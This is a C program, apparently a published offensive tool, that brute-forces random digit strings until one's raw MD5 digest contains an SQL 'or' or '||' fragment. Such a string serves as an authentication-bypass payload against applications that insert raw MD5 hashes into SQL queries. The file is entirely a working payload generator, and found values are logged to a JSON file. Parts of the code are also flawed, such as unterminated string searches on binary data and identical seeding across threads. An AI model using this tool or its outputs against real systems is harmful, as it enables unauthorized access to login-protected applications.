#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <openssl/evp.h>

#include "./includes/hashes/hashes_libssl_above_1.1.0.h"

#define _NUM_THREADS 32

pthread_mutex_t mutex_report_value;
pthread_t threads[_NUM_THREADS];
short threads_running = 1;

char * path_to_logfile = "./found_md5sqli.json";

void handler_sigint(int dummy) {
    threads_running = 0;
    printf("\n[+] Preparing for stop ...\n");
}

void * report_value(char * random_input, unsigned char * hash_value, unsigned int hash_len) {
    pthread_mutex_lock(&mutex_report_value);
    FILE * fp;
    short tab_index = 0;

    fp = fopen(path_to_logfile, "a");
    fprintf(fp, "{\"value\" : \"%s\", \"hex\" : \"", random_input);
    for(tab_index = 0; tab_index < hash_len; tab_index++) {
        fprintf(fp, "%02x", hash_value[tab_index]);
    }
    fprintf(fp, "\"}\n");
    fclose(fp);

    printf("{'value' : '%s', 'hex' : '", random_input);
    for(tab_index = 0; tab_index < hash_len; tab_index++) {
        printf("%02x", hash_value[tab_index]);
    }
    printf("'}\n");
    fflush(stdout);
    pthread_mutex_unlock(&mutex_report_value);
}

void * thread_find_md5_sqli(void * vargp) {
    unsigned char hash_value[EVP_MAX_MD_SIZE];
    unsigned int  hash_len = 0;
    int r, r1, r2, r3;
    char random_input[100];
    char * match;

    srand(time(NULL));
    while (threads_running) {
        // pick a random string made of digits
        r = rand(); r1 = rand(); r2 = rand(); r3 = rand();
        sprintf(random_input, "%d%d%d%d", r, r1, r2, r3);

        md5(random_input, hash_value, &hash_len);

        // find || or any case of OR
        match = strstr(hash_value, "'||'");
        if (match == NULL) {
            match = strcasestr(hash_value, "'or'");
        }

        if (match != NULL && match[4] > '0' && match[4] <= '9') {
            report_value(random_input, hash_value, hash_len);
        }
    }
    return NULL;
}

int main() {
    // Connecting Signal INTERRUPT (Ctrl + C) to function handler_sigint
    signal(SIGINT, handler_sigint);

    short tk = 0; //Thread counter in loops

    printf("[+] Fuzzer of values that produces SQL injections with their raw hashes values\n");
    printf("[+] by Remi GASCOU (Podalirius) \n\n");

    if (access(path_to_logfile, F_OK) != -1) {
        printf("[+] File %s already exists, appending new values to it.\n", path_to_logfile);
    } else {
        printf("[+] Creating out file %s ... ", path_to_logfile);
        fclose(fopen(path_to_logfile, "w"));
        printf("Done.\n");
    }

    // Getting the start time
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    printf(
        "[+] Started at : %d-%02d-%02d %02dh %02dm %02ds\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec
    );

    // Printing the number of workers
    printf("[+] Workers : %d\n", _NUM_THREADS);

    // Starting workers and saving them in threads[...] table
    for (tk = 0; tk < _NUM_THREADS; tk++) {
        printf("   [>] Starting worker %d ...\n", tk);
        sleep(0.25);
        pthread_create(&threads[tk], NULL, thread_find_md5_sqli, NULL);
    }

    printf("[+] Running ...\n");

    for (tk = 0; tk < _NUM_THREADS; tk++) {
        pthread_join(threads[tk], NULL);
        printf("   [>] Stopped worker %d.\n", tk);
    }

    t  = time(NULL);
    tm = *localtime(&t);
    printf(
        "[+] Stopped at : %d-%02d-%02d %02dh %02dm %02ds\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec
    );
    exit(0);
}
